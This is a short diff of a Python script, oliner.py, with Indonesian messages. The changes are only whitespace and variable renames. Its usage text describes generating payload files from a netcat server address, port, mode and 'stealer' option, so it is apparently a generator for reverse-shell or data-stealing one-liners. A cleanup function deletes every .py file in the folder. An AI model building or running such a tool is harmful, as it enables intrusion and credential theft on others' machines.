@@ -35,16 +35,16 @@ def Oliner(mode, stealer):
 def gen(out, txt):
     with open(out, "w") as file:
         file.write(txt)
-
+        
 def delpayload():
-    files = glob.glob("*payload*")
-    for file in files:
-        os.remove(file)
+    f1 = glob.glob("*payload*")
+    for file1 in f1:
+        os.remove(file1)
     f2 = glob.glob("*.py")
     for file2 in f2:
         os.remove(file2)
     return "\nSemua file payload berhasil dihapus\n"
-
+        
 def help():
     print(len(sys.argv))
     print("""Info:
@@ -55,7 +55,7 @@ server - [ip server netcat]
 port - [port server netcat]
 
 Penggunaan: python oliner.py [server] [port] [mode] [stealer] [output]\n""")
-
+    
 if len(sys.argv) < 7:
     if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
         help()
@@ -67,15 +67,15 @@ if len(sys.argv) < 7:
         m = sys.argv[3]
         s = sys.argv[4]
         o = sys.argv[5]
-
+        
         if m in md:
             text = Oliner(m, s)
             if os.path.exists(o):
                 os.remove(o)
                 print(f"\nFile {o} sudah ada dan berhasil dihapus\nMohon jalankan ulang script ini\n")
-
+            
             gen(o, text)
-
+            
             if os.path.exists(o):
                 print(f"File {o} berhasil dibuat dengan mode {m}")
             else:
